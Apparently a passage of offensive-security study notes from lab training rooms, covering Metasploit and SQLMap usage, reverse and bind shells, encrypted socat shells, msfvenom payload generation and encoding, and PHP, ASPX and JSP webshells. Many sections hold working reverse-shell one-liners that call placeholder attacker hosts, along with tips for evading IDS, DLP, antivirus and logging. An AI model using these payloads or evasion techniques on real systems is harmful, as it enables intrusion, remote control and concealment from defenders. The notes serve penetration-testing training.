**Rule of thumb: verify before you exploit.** Run the auxiliary scanner to confirm a vulnerability before loading the exploit module — critical for anything that risks service disruption (EternalBlue can crash a target if the payload doesn't land cleanly).

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOST 10.0.0.5
run
# confirmed vulnerable →
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.0.0.5
set LHOST 10.0.0.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
meterpreter > getuid
```

> [!warning] Once a session opens, resist the urge to explore further than needed Meterpreter offers a huge range of post-exploitation capability — using more of it than necessary to prove the specific finding risks over-exploitation and straying into out-of-scope territory. Run the minimum commands needed to demonstrate impact, then stop.

#### Burp Suite

**Proxy** intercepts browser↔app traffic; **Repeater** modifies and resends individual requests manually — where most controlled web exploitation actually happens. Change one parameter at a time, observe the response — precise control plus a clean request/response evidence pair in one step.

> [!warning] Intruder needs extra caution A large wordlist combined with aggressive throttling settings can overwhelm a web application and cause real disruption. On production systems: lowest effective settings that still demonstrate impact. On any system: confirm authorisation for automated, high-volume attacks before running anything that generates significant request volume.

#### SQLMap

Automates SQL injection detection/exploitation — also one of the most commonly **misused** tools in the field.

**Controlled usage pattern:**

```bash
# Identify injection + list databases
sqlmap -u "https://store.thm/product?id=1" --dbs --level=1 --risk=1

# List tables in a specific database
sqlmap -u "https://store.thm/product?id=1" -D targetdb --tables

# Retrieve a single row only
sqlmap -u "https://store.thm/product?id=1" -D targetdb -T users --dump --start=1 --stop=1
```

- Defaults are a reasonable starting point — only raise `--level`/`--risk` if lower settings fail to detect the injection
- `--start=1 --stop=1` limits output to exactly one row — sufficient to prove read access without a full extraction
- **Never use `--dump-all`/`--all` on a live system** — attempts to extract every database/table/record, the direct opposite of controlled, minimal exploitation

**Reading tool output accurately matters as much as running the tool:**

- Metasploit "exploit completed, but no session was created" → the exploit ran but failed to return a shell, not necessarily "not vulnerable"
- SQLMap reporting a false positive → the injection point needs manual verification, not automatic trust
- Nikto flagging an outdated server header → does **not** by itself confirm vulnerability to the associated CVE — a version banner is a lead, not proof

> [!warning] Tools reduce effort, not judgement Automated tools speed up finding and confirming vulnerabilities — they don't replace the analysis needed to understand what the output actually means. Explaining what a tool achieved and why it matters is what converts raw output into a defensible finding for the report.

> [!summary] Quick Recap — Tools in Context
> 
> - Metasploit: scanner-confirm before exploit-fire, always — especially for anything with crash risk (EternalBlue)
> - Burp Repeater is the precision tool for controlled parameter testing; Intruder needs deliberate throttling/authorisation awareness before high-volume use
> - SQLMap: start at `--level=1 --risk=1`, use `--start=1 --stop=1` to prove read access with one row — never `--dump-all` on a live system
> - Tool output requires interpretation, not blind trust — a "no session" message, a flagged false positive, or an outdated banner are all leads requiring judgement, not automatic conclusions

---

> [!summary] Full Exploitation and Weaponisation Room — One Glance
> 
> - Weaponisation (this room's definition) = proving business impact, not just technical flaw existence — distinct from the Cyber Kill Chain's "payload creation" definition of the same word
> - Before exploiting: analyse the affected functionality, confirm exploitability directly (scanner/`check`/baseline comparison), reproduce at least twice, and only exploit when documentation alone isn't credible enough
> - Controlled exploitation = minimal proof of control + scoped blast radius (reversible actions justify themselves, irreversible ones need authorisation) + continuous documentation as you go
> - Weaponisation = identifying which trust boundary is crossed, separating technical access from actual business impact, and recognising when legitimate functionality itself becomes the attack path
> - Chaining links otherwise-unimpressive findings (info disclosure, broken access control, logic flaws) into a realistic, higher-severity attack narrative — same minimal-exploitation discipline applies to every link
> - Tool discipline: verify-before-exploit in Metasploit, precise single-parameter testing in Burp Repeater, minimal-flag SQLMap usage, and always interpreting tool output with judgement rather than taking it at face value
### Shells & Listeners Fundamentals

> [!info] Room context The gap between "code runs" (RCE) and "I own this box." A **shell** is a command-line environment interacting with an OS — locally, `bash`/`cmd.exe`/PowerShell; remotely, the goal is a shell on the target reachable from the attacker's host. Initial shells are usually "half-shells" — non-interactive, no tab-completion, no job control, broken `su`/`ssh`, no proper TTY. This room covers catching shells (netcat, socat), stabilising them into full TTYs, and encrypting the traffic — practiced on Linux first, then repeated on Windows.

#### Reverse vs. Bind Shells

**The core distinction is who initiates the connection.**

**Reverse shell** — the target initiates an **outbound** connection to an attacker-controlled listener. Most commonly used in practice, because outbound traffic is typically far less restricted than inbound.

```bash
# Attacker: start the listener first
nc -lvnp 4444

# Target: connect back
nc CONNECTION_IP 4444 -e /bin/bash
```

**Bind shell** — the target opens a **listening** port and waits; the attacker connects in. Removes the need to accept inbound traffic on the attacker's side, but the target's own firewall may block the listening port.

```bash
# Target: listener attached to a shell
nc -lvnp 8080 -e /bin/bash

# Attacker: connect to it
nc MACHINE_IP 8080
```

**When to choose which:**

|Reverse shells work best when...|Bind shells work best when...|
|---|---|
|Target can make outbound connections (most common case)|Outbound from target is heavily restricted|
|Firewalls block inbound connections to the target|Attacker can't accept inbound connections|
|Target is behind NAT with no port forwarding|Target has accessible ports (firewall rules/forwarding)|
|Attacker wants to control the listening port themselves|Multiple people need access to the same shell|

> [!note] Why reverse shells dominate in practice Most networks permit outbound traffic broadly while restricting inbound access tightly — the opposite configuration (permissive inbound, restricted outbound) is rare. Both techniques achieve the same result (remote command execution); the choice is purely about which direction the target's network configuration actually permits.

> [!summary] Quick Recap — Reverse vs. Bind
> 
> - Reverse = target connects out to attacker; bind = attacker connects in to target
> - Reverse is the practical default because outbound traffic is almost always less restricted than inbound
> - Bind is the fallback when outbound is blocked but a specific inbound port is reachable
> - Both are functionally equivalent in outcome — the choice is dictated entirely by the target's actual network/firewall configuration

---

#### Tools for Remote Shells

A progression from simple to sophisticated — each tool builds on the previous one's limitations.

**Netcat (`nc`)** — the foundational tool. Simple pipe: listens or connects, passes data between the socket and the terminal. Strengths: lightweight, fast, available almost everywhere. Limitations: no encryption, minimal interactivity, feels clunky over extended sessions. **Use for:** proving a shell works, rapid initial access, quick recon.

**`rlwrap`** — solves netcat's lack of command history/line editing. Raw netcat shells ignore arrow keys and tab completion entirely. `rlwrap` wraps the listener command, adding readline features immediately. **Use whenever** a shell will see more than trivial command execution — the difference over a long session is substantial.

**Socat** — does everything netcat does, plus data manipulation, **PTY allocation**, and SSL/TLS encryption. PTY allocation is the headline feature: makes the shell behave like a genuine terminal — proper signal handling, job control, support for interactive programs (text editors, etc.). Encryption makes shell traffic indistinguishable from legitimate HTTPS. **Trade-off:** not always pre-installed on targets, unlike netcat — but static binaries can be transferred post-initial-access.

**Msfvenom & `multi/handler`** — enterprise-grade payload generation and handling: cross-platform payloads, staged delivery (useful under size restrictions), Meterpreter's full post-exploitation feature set, automatic encoding/evasion. **Trade-off:** more setup time and resource overhead — better suited to planned operations than opportunistic quick access.

**How they chain together in practice:** start with netcat for initial access → wrap with `rlwrap` for usability → upgrade to socat for stability/interactivity → escalate to Metasploit for advanced post-exploitation. Not every engagement needs the full chain — but knowing where each tool's ceiling is tells you when to reach for the next one.

> [!summary] Quick Recap — Tool Progression
> 
> - Netcat = fastest path to proving a shell works, nothing more
> - `rlwrap` = bolt-on usability (history, arrow keys) for any netcat listener, essentially free to add
> - Socat = the real upgrade — PTY allocation for genuine interactivity, plus built-in encryption
> - Metasploit/`msfvenom` = the heavyweight option for cross-platform, staged, or Meterpreter-dependent scenarios
> - None of these are mutually exclusive — a realistic session often starts with netcat and ends with socat or Metasploit as needs escalate

---

#### Working with Netcat

**Starting a listener:**

```bash
sudo nc -lvnp 4444
```

- `-l` listen mode, `-v` verbose, `-n` skip DNS lookups (numeric IPs only), `-p` port
- Port choice: above 1024 avoids needing root (`4444`, `8080` are common); ports 80/443/53 may pass firewalls more easily but require `sudo` to bind

**Reverse shell (target side):**

```bash
nc CONNECTION_IP 4444 -e /bin/bash
```

> [!note] `-e` isn't universal Some netcat variants (notably OpenBSD netcat) disable `-e` for security reasons. If unavailable, command execution is still achievable via named pipes or other techniques — the listener/connection workflow itself doesn't change.

**Bind shell (target listens, attacker connects):**

```bash
# Target
nc -lvnp 8080 -e /bin/bash

# Attacker
nc MACHINE_IP 8080
```

**`nc` vs. `ncat`:** `ncat` (Nmap project) is a modern reimplementation adding SSL/TLS, proxy support, connection brokering, and better IPv6 handling — traditional `nc` stays simpler and more universally available. Both work identically for basic shell operations; `ncat --help` reveals the extended feature set.

**Other flags worth knowing:** `-u` (UDP instead of TCP — rare for shells, unreliable), `-w` (connection timeout), `-q` (wait N seconds after stdin EOF before closing).

> [!summary] Quick Recap — Netcat
> 
> - `-lvnp <port>` is the standard listener invocation; port >1024 avoids root requirements
> - `-e` for direct shell execution isn't available on every netcat variant (OpenBSD notably lacks it) — have a fallback in mind
> - `ncat` adds SSL/proxy/IPv6 support over traditional `nc` but both handle basic reverse/bind shells identically

---

#### Working with Socat

Different syntax entirely — **address specifications** rather than simple flags: `socat [options] address1 address2`, data flows between the two.

**Basic reverse shell:**

```bash
# Attacker listener — dash (-) means stdin/stdout, i.e. display on the terminal
socat TCP-L:443 -

# Target — connects back and executes a login interactive shell
socat TCP:CONNECTION_IP:443 EXEC:"bash -li"
```

`bash -li` (login interactive) provides a noticeably more complete environment than a bare `bash` invocation.

**Windows reverse shell** — swap the executable, add `pipes` for proper Windows I/O redirection:

```powershell
socat TCP:CONNECTION_IP:443 EXEC:powershell.exe,pipes
```

(`cmd.exe,pipes` works equally for a traditional Command Prompt shell.)

**Basic bind shell:**

```bash
# Target — listens, spawns a shell on connect
socat TCP-L:8088 EXEC:"bash -li"

# Attacker — connects in
socat TCP:MACHINE_IP:8088 -
```

**Windows bind shell:**

```powershell
socat TCP-L:8088 EXEC:cmd.exe,pipes
```

> [!summary] Quick Recap — Socat Basics
> 
> - `TCP-L:<port>` listens, `TCP:<host>:<port>` connects — the address-specification model replaces netcat's flag-based syntax
> - `EXEC:"bash -li"` spawns a proper login-interactive shell, not just a bare command interpreter
> - Windows targets need the `pipes` option on the shell executable for correct I/O redirection
> - Socat's real value (PTY allocation, encryption) comes in the next two sections — this is just the netcat-equivalent baseline

---

#### Shell Stabilisation

Raw netcat shells are brittle: no arrow keys, no tab completion, `ssh`/`su` misbehave, a stray Ctrl+C can kill the whole session. Three escalating stabilisation techniques.

#### Method 1 — Spawning a TTY with Python

**Before starting, note local terminal dimensions:**

```bash
stty size
# e.g. 50 220
```

**Standard netcat reverse shell setup** (listener + target connection), then upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`pty.spawn()` creates a genuine pseudo-terminal and runs `/bin/bash` inside it — immediately more interactive.

**Set terminal type** for correct output formatting:

```bash
export TERM=xterm
```

**Complete stabilisation — suspend, configure locally, resume:**

```
Ctrl+Z                    # suspend the shell locally
stty raw -echo             # on the attacker's own terminal
fg                          # resume
```

- `raw` disables local input processing (keystrokes pass straight through)
- `-echo` prevents the attacker's own terminal from double-displaying typed characters

**Apply the noted dimensions back on the target shell:**

```bash
stty rows 50 cols 220
```

> [!warning] Exiting leaves the local terminal in raw mode After exiting the target shell, the attacker's own terminal stays in raw mode from the earlier `stty raw -echo`. Run `stty sane` to restore normal behaviour. If the connection drops unexpectedly while still in raw mode, type `reset` and press Enter — even though nothing will visibly appear as it's typed.

#### Method 2 — Wrapping the Listener with `rlwrap`

Python's `pty` gives a functional TTY but still no command history/tab completion. `rlwrap` adds these on top:

```bash
rlwrap nc -lvnp 4444
```

Once connected, the **same** Python stabilisation steps apply (`pty.spawn`, `TERM=xterm`, `stty raw -echo`) — the difference is `rlwrap` now provides up/down command history and basic tab completion for the whole session.

#### Method 3 — Fully Interactive Shell with Socat

The most stable option — full PTY with complete signal handling and job control. If socat isn't on the target, transfer it first:

```bash
# Attacker: serve the binary
sudo python3 -m http.server 80

# Target: fetch and make executable
wget http://CONNECTION_IP/socat -O /tmp/socat
chmod +x /tmp/socat
```

**Windows file transfer equivalent:**

```powershell
Invoke-WebRequest -Uri http://CONNECTION_IP/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

**Establishing the full TTY shell:**

```bash
# Attacker listener — connects to the local terminal, raw mode, no local echo
socat TCP-L:5555 FILE:`tty`,raw,echo=0

# Target — full TTY options
/tmp/socat TCP:CONNECTION_IP:5555 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

**What each target-side option does:**

- `pty` — allocates a pseudo-terminal for proper program interaction
- `stderr` — forwards error output, so nothing gets silently swallowed
- `sigint` — enables Ctrl+C signal handling for interrupting running processes
- `setsid` — creates a new session for proper job control
- `sane` — applies standard terminal settings for consistent behaviour

> [!note] The end result At this point the shell is functionally equivalent to a direct SSH login — `vim` runs correctly, Ctrl+Z backgrounds processes normally, tab completion works as expected.

> [!summary] Quick Recap — Stabilisation
> 
> - Python `pty.spawn()` is the fast, near-universal first upgrade — works on any target with Python installed
> - `TERM=xterm` + local `stty raw -echo`/`fg` completes basic stabilisation; always `stty sane` afterward to restore the local terminal
> - `rlwrap` layered on top of the same Python steps adds command history/tab completion at zero extra cost
> - Socat's full option set (`pty,stderr,sigint,setsid,sane`) is the ceiling — genuinely SSH-equivalent interactivity, worth the binary transfer when socat isn't pre-installed

---

#### Encrypted Shells

Plaintext shells are visible to network monitoring, IDS, and DLP inspection — a `nc` connection to port 4444 is an immediate red flag. **Encrypted shells wrap traffic in SSL/TLS**, making it look like ordinary HTTPS while hiding actual shell content.

**Why encrypt:**

- Plaintext shell traffic on unusual ports draws immediate attention; SSL on 443/8443 blends with normal web traffic
- DLP systems inspecting for sensitive data/suspicious commands can't see through encrypted content
- Some compliance frameworks mandate encrypted administrative connections outright

**Certificate generation** — self-signed certificates provide encryption without needing a real CA; the target accepts them with verification disabled:

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
```

- `-newkey rsa:2048` generates a 2048-bit RSA keypair
- `-nodes` = unencrypted private key (no passphrase prompt on use)
- `-x509` outputs a self-signed cert directly instead of a signing request
- `-days 365` sets validity — actual certificate detail content doesn't matter for this purpose, any values work

**Combine into a single PEM for socat:**

```bash
cat shell.key shell.crt > shell.pem
```

**Encrypted reverse shell:**

```bash
# Attacker listener
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -

# Target
socat OPENSSL:CONNECTION_IP:443,verify=0 EXEC:/bin/bash
```

`verify=0` on both ends is what allows self-signed certificates to work without a real CA chain — omitting it on either side breaks the connection.

**Windows encrypted reverse shell** — same syntax, swap the executable + `pipes`:

```powershell
socat OPENSSL:CONNECTION_IP:443,verify=0 EXEC:powershell.exe,pipes
```

**Encrypted bind shell** — requires the certificate on the target first:

```bash
# Attacker: serve the cert
sudo python3 -m http.server 80

# Target: fetch it
wget http://CONNECTION_IP/shell.pem -O /tmp/shell.pem

# Target: SSL listener
socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"

# Attacker: connect in
socat OPENSSL:MACHINE_IP:8443,verify=0 -
```

**Windows encrypted bind shell:**

```powershell
Invoke-WebRequest -Uri http://CONNECTION_IP/shell.pem -OutFile C:\Windows\Temp\shell.pem
socat OPENSSL-LISTEN:8443,cert=C:\Windows\Temp\shell.pem,verify=0 EXEC:cmd.exe,pipes
```

**Encrypted TTY shell — combining encryption with full stabilisation, the best of everything covered so far:**

```bash
# Attacker
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# Target
socat OPENSSL:CONNECTION_IP:443,verify=0 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Encryption **and** a proper TTY over a single connection — looks like normal HTTPS externally, works like a direct login internally.

**Operational considerations:**

- **Port selection matters** — 443 is the safest default since SSL is expected there; 8443/9443 also read as normal web service ports. Anything unusual invites scrutiny
- **Pre-generate certificates** for longer engagements, filling in realistic organisational details to reduce suspicion if the cert is ever inspected
- **Performance impact is minimal** on modern systems — a real but rarely operationally significant CPU/bandwidth cost, more noticeable only on constrained embedded targets

**Troubleshooting SSL connections:**

- Verify both endpoints actually support OpenSSL — check with `socat -V` and look for OpenSSL in the feature list
- Certificate path issues are common — use absolute paths, confirm read permissions for the socat process
- **"certificate verify failed"** — almost always means `verify=0` is missing on one side; self-signed certs require it disabled on **both** ends to function

> [!summary] Quick Recap — Encrypted Shells
> 
> - Encryption defeats content inspection (IDS/DLP) and makes traffic blend with legitimate HTTPS — a red-team stealth technique, not just a confidentiality measure
> - Self-signed certs + `verify=0` on both ends is the standard pattern — no real CA needed for this use case
> - Port 443/8443/9443 are the operationally sensible choices — matching expected SSL traffic patterns
> - The encrypted TTY shell (OPENSSL + pty/stderr/sigint/setsid/sane) is the room's overall ceiling — full stability plus full stealth in one connection
> - "certificate verify failed" almost always traces back to a missing `verify=0` on one side, not an actual certificate problem

---

> [!summary] Full Shells & Listeners Room — One Glance
> 
> - Reverse (target connects out) vs. bind (attacker connects in) — reverse dominates because outbound is typically less restricted than inbound
> - Tool progression: netcat (prove it works) → `rlwrap` (usability) → socat (PTY + encryption) → Metasploit (enterprise/cross-platform/Meterpreter)
> - Netcat: `-lvnp` listener, `-e` for direct execution (not universal — OpenBSD lacks it)
> - Socat: address-specification syntax (`TCP-L`/`TCP:`/`EXEC:`), `pipes` for Windows I/O
> - Stabilisation ladder: Python `pty.spawn()` → `TERM`/`stty raw -echo` → `rlwrap` for history → socat's full `pty,stderr,sigint,setsid,sane` for SSH-equivalent interactivity
> - Encryption: self-signed cert + PEM + `OPENSSL`/`OPENSSL-LISTEN` + `verify=0` on both ends — combines with full TTY stabilisation for the practical ceiling of a post-exploitation shell
### Shell Payload Generation & Delivery

> [!info] Room context Bridges "I can catch shells" (Shells & Listeners Fundamentals) with "I can generate the payloads that create those shells in the first place." Covers manual shell payloads across languages/platforms, `msfvenom` payload generation, `multi/handler` session management, webshells, and full hands-on Linux + Windows practical chains.

### Common Shell Payloads

Beyond basic netcat, real engagements need alternatives — some systems lack netcat entirely, others restrict it, many environments filter simple shell commands outright.

**Netcat without `-e`** — many modern distros (notably OpenBSD netcat) strip the `-e` flag for security. **Named pipes (FIFOs)** recreate the same functionality: a FIFO bridges two processes so data written by one is readable by the other, creating a circular flow — netcat passes commands to a shell, the shell's output flows back through netcat.

```bash
# Bind shell without -e
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Reverse shell without -e
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Both clean up the pipe on connection close — no artefacts left behind.

**PowerShell reverse shell** — Windows environments often have PowerShell available even when traditional CLI tools are restricted. Uses .NET's TCP client classes directly, no additional binaries needed:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Loops continuously: read from the network, treat it as a command, execute via `iex` (Invoke-Expression), send output back — including a PowerShell-style prompt for usability.

**Script-based shells** — Python, Perl, Ruby, PHP all have networking capabilities usable when traditional tools are absent, especially valuable through web apps, scheduled tasks, or other non-interactive execution paths.

Python:

```python
python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Creates a socket, duplicates it onto stdin/stdout/stderr, spawns bash inside a pseudo-terminal.

Bash (`/dev/tcp`):

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Uses bash's built-in `/dev/tcp` pseudo-device. **Requires bash compiled with `--enable-net-redirections`** — may be absent on minimal installs.

**Payload selection strategy** — factors to weigh:

- **Target OS** — Windows favours PowerShell; Linux works well with bash/Python/netcat alternatives
- **Available interpreters** — check what's actually installed before committing to a payload type
- **Network restrictions** — some environments filter specific outbound ports/protocols; test alternatives if the first attempt fails
- **Execution context** — web shells, scheduled tasks, service accounts often carry different privileges/tool availability than an interactive session
- **Detection concerns** — PowerShell in particular is heavily monitored on modern Windows; some payloads simply trigger more alerts than others

> [!note] Resource worth bookmarking **PayloadsAllTheThings** (GitHub, Methodology and Resources section) maintains a comprehensive cheat sheet across Python, Perl, Ruby, PHP, Java, and more — valuable for unusual target environments where the standard options don't apply.

> [!summary] Quick Recap — Common Shell Payloads
> 
> - Named pipes recreate netcat's `-e` functionality when it's unavailable (OpenBSD netcat)
> - PowerShell reverse shells need zero additional binaries on Windows — pure .NET socket usage
> - `/dev/tcp` bash shells require a specific bash build flag — not guaranteed present on minimal installs
> - Payload choice should be driven by target OS, available interpreters, network filtering, execution context, and detection posture — not just "whatever worked last time"

---

#### `msfvenom`

**Role:** automated payload generator/encoder — handles cross-platform targeting, AV-evasion encoding, dozens of output formats, and direct integration with Metasploit's post-exploitation modules. Produces complete standalone payloads deliverable via email, web upload, or exploit frameworks — a step up from hand-typed one-liners.

**Basic syntax:**

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.14.15 LPORT=4444
```

**Staged vs. stageless** (same underlying distinction as prior rooms, reinforced here):

- **Stageless** — everything needed in one self-contained package, connects immediately on execution. Works with plain netcat listeners, no special handling software needed. **Trade-off:** larger file, all shell code present at once → more signature-matchable by AV
- **Staged** — small initial stager establishes a connection, then downloads the full payload from the attacking machine. **Trade-off:** the full payload never touches disk (harder for file-based AV to catch), but requires a staging-aware listener (`multi/handler`) — plain netcat can't handle the handshake

**Naming convention** (recap, reinforced with more examples):

- `linux/x64/shell_reverse_tcp` — stageless (underscore)
- `windows/x64/shell/reverse_tcp` — staged (slash)
- `windows/shell_reverse_tcp` — stageless, 32-bit
- `osx/x64/shell_reverse_tcp` — stageless, macOS

> [!warning] The naming convention isn't 100% universal Underscore=stageless / slash=staged holds for most payloads and is a reliable first indicator — but not guaranteed across the entire library. When in doubt, `msfvenom --info <payload>` confirms staged vs. stageless directly rather than trusting the name alone.

**Meterpreter payloads** — Metasploit's advanced shell environment: built-in file ops, network discovery, privilege escalation, and system manipulation, running entirely in memory (harder to detect than disk-reliant traditional shells).

```bash
# Windows 64-bit staged Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -o meterpreter_staged.exe

# Linux 32-bit stageless Meterpreter
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f elf -o meterpreter_stageless
```

Meterpreter always requires `multi/handler` for proper session management regardless of staged/stageless.

**Output formats, by use case:**

|Format|Use|
|---|---|
|`exe`|Windows direct execution|
|`elf`|Linux executable|
|`dll`|DLL injection attacks|
|`aspx`|IIS web shells|
|`jsp`|Java web application shells|
|`war`|Java application server archives|
|`python`|Python-interpreter targets|
|`powershell`|PowerShell script execution|

**Discovering available payloads:**

```bash
msfvenom --list payloads | grep linux | grep meterpreter
```

**Encoding for signature evasion:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -e x64/xor -i 3 -o encoded_shell.exe
```

- `-e` selects the encoder, `-i 3` applies 3 encoding iterations, each changing the byte signature further

> [!warning] Encoding is still not real evasion (consistent with the Payload Generation room's stance) Encoding transforms the payload's byte pattern via mathematical operations (XOR, etc.) — this can help against basic signature-only AV, but **modern security solutions increasingly use behaviour-based detection** that identifies malicious activity regardless of the underlying encoding. Don't treat encoding as a stealth guarantee.

**Integration considerations before generating anything:**

- **Delivery method** — email attachment, web upload, USB drop, exploit integration each favour different formats/characteristics
- **Execution context** — user privileges, available interpreters, system restrictions shape both payload selection and encoding needs
- **Handler preparation** — staged payloads need `multi/handler`; stageless can use a plain netcat listener

> [!summary] Quick Recap — msfvenom
> 
> - Stageless = netcat-compatible, larger, fully on-disk; staged = needs `multi/handler`, smaller initial footprint, payload never fully touches disk
> - `_` vs `/` naming is a reliable first indicator but not universal — `--info` confirms when uncertain
> - Meterpreter always needs `multi/handler` regardless of staging type
> - Encoding changes byte signatures, not behaviour — still not a real evasion guarantee against modern EDR

---

#### Metasploit `multi/handler`

**Why it's needed beyond netcat:** staged payloads and Meterpreter sessions rely on a **staging protocol** — receiving a stager, sending back the full payload, negotiating Meterpreter's communication protocol, tracking multiple sessions. Plain netcat just passes raw bytes; it can't participate in this handshake.

**Setup:**

```
sudo msfconsole
use multi/handler
options
```

**Configure — three parameters must match the generated payload EXACTLY:**

```
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST 10.10.14.15
set LPORT 4444
```

> [!warning] LHOST is hardcoded into the payload at generation time The payload only connects back to the exact IP baked in during `msfvenom` generation — the handler's `LHOST` must match that value precisely, not just "an IP that works." On the AttackBox, the correct interface is typically `ens5` — verify rather than assume.

**Starting the handler:**

```
exploit -j
```

`-j` backgrounds it, freeing the console for other work while it listens. Ports below 1024 require running Metasploit with `sudo`.

**Connection handling** — staged payloads show explicit staging progress:

```
[*] Sending stage (200774 bytes) to 10.10.14.100
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.14.100:49847)
```

**Session management:**

```
sessions                # list all active sessions
sessions -i 1            # interact with a specific session
```

Return to the console from an active session with `Ctrl+Z` or `background` — the session stays alive, just out of focus.

**Running multiple concurrent handlers** (different ports, different payload types):

```
set LPORT 8080
exploit -j
jobs                     # lists all running handler jobs
```

**Why `multi/handler` over a plain listener, concretely:**

- Session persistence/error handling — unlike netcat, which just dies on network drop, Meterpreter sessions have reconnection logic and built-in persistence mechanisms
- Direct integration with post-exploitation modules — privilege escalation checks, system info gathering, pivoting, all run straight from an established session

**When to use which:**

|Use `multi/handler` when...|Use a simple listener when...|
|---|---|
|Staged payloads (two-phase communication)|Stageless payloads, no staging needed|
|Meterpreter sessions for post-exploitation|Quick recon or basic command execution|
|Managing multiple concurrent sessions|Resource-constrained environments|
|Session persistence/error handling matters|Lightweight tooling preferred, no framework overhead|

**Common failure points to check first:**

- **Payload mismatch** — handler payload must match exactly, including architecture and staging type (`shell/reverse_tcp` ≠ `shell_reverse_tcp`)
- **`LHOST` misconfiguration** — must be the actual interface IP, never `0.0.0.0` or `localhost`
- **Firewall blocking** — confirm the attacking machine's own firewall permits inbound on the configured `LPORT`

> [!summary] Quick Recap — multi/handler
> 
> - Required whenever staging is involved (staged payloads, all Meterpreter) — plain netcat can't participate in the staging handshake
> - Payload string, `LHOST`, `LPORT` must match the generated payload exactly — any mismatch fails silently, same golden rule as the Payload Generation room
> - `exploit -j` backgrounds the handler; `jobs` lists everything running concurrently
> - Payload mismatch, wrong `LHOST`, and local firewall blocking are the three first things to check when a payload fires but nothing lands

---

#### Webshells

**When to reach for a webshell:** firewalls/network restrictions blocking traditional reverse/bind shells. Webshells run entirely over HTTP/HTTPS — network monitoring sees ordinary web traffic, not an obvious out-of-band connection.

**What a webshell is:** a server-side script (PHP/ASP/JSP/Python) accepting commands via HTTP requests (URL params, POST data, form fields) and running them with the web server's own privileges. Output returns as HTML.

**Minimal PHP webshell:**

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

```
http://target-server.thm/uploads/shell.php?cmd=whoami
```

**Enhancements for usability/stealth:**

**POST-based execution** (avoids command strings landing in access logs/URL history):

```php
<?php
if ($_POST['cmd']) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
```

**Authentication gate** (stops other attackers/defenders reusing the shell):

```php
<?php
$password = "secure_password_here";
if ($_POST['auth'] === $password && $_POST['cmd']) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
} else if ($_POST['auth'] && $_POST['auth'] !== $password) {
    echo "Authentication failed";
}
?>
```

**Platform-specific variants:**

ASP.NET (IIS):

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```

JSP (Java):

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) { out.println(line); }
    out.println("</pre>");
}
%>
```

**Upgrading a webshell into a full interactive shell** — the webshell's command execution bootstraps a real reverse/bind connection.

For Windows, the same PowerShell one-liner from earlier, **URL-encoded** for HTTP transmission through the `cmd` parameter.

For Linux — URL-encoding is essential, since spaces/quotes/`>`/`&` will otherwise fragment the command before it reaches the server:

```bash
curl -G "http://target-server.thm/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

`curl -G` + `--data-urlencode` handles the encoding automatically rather than hand-encoding a URL manually.

**Pre-built collections:** Kali/AttackBox ship `/usr/share/webshells/` — notably `php-reverse-shell.php` (PentestMonkey), which opens a **direct reverse connection** on load rather than requiring one-command-at-a-time HTTP requests like the minimal examples above.

**Detection and evasion considerations:**

- **WAFs** scan uploaded files/request parameters for known webshell patterns — obfuscation/custom encoding can bypass basic rules, but behavioural WAF detection is improving
